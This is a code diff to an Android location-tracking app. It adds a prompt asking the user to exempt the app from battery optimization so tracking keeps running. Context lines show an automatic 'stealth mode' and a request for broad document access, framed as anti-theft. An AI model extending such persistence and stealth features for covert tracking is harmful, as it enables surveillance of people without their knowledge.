@@ -2,6 +2,7 @@ package com.example.locationtracker;
 
 import android.Manifest;
 import android.os.Environment;
+import android.os.PowerManager;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -255,6 +256,9 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
         // Автоматически активируем stealth режим
         activateStealthMode();
 
+        // Критично: без этого Android/MIUI/EMUI убивают фоновые сервисы через несколько минут
+        requestBatteryOptimizationExemption();
+
         // Android 11+: запрашиваем MANAGE_EXTERNAL_STORAGE для доступа к документам
         // (PDF, DOC, TXT и другие файлы не покрываются READ_MEDIA_*)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
@@ -264,6 +268,33 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
                     .setPositiveButton("Разрешить", (dialog, which) -> requestStoragePermission())
                     .setNegativeButton("Пропустить", null)
                     .show();
+        }
+    }
+
+    private void requestBatteryOptimizationExemption() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                new AlertDialog.Builder(this)
+                        .setTitle("Фоновая работа")
+                        .setMessage("Для постоянного отслеживания при краже или утере телефона необходимо отключить оптимизацию батареи. Нажмите «Разрешить» в следующем окне.")
+                        .setPositiveButton("Разрешить", (dialog, which) -> {
+                            try {
+                                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                                intent.setData(Uri.parse("package:" + getPackageName()));
+                                startActivity(intent);
+                            } catch (Exception e) {
+                                // На некоторых устройствах прямой запрос недоступен — открываем общие настройки
+                                try {
+                                    startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
+                                } catch (Exception ex) {
+                                    Log.e(TAG, "Cannot open battery settings", ex);
+                                }
+                            }
+                        })
+                        .setNegativeButton("Пропустить", null)
+                        .show();
+            }
         }
     }
 
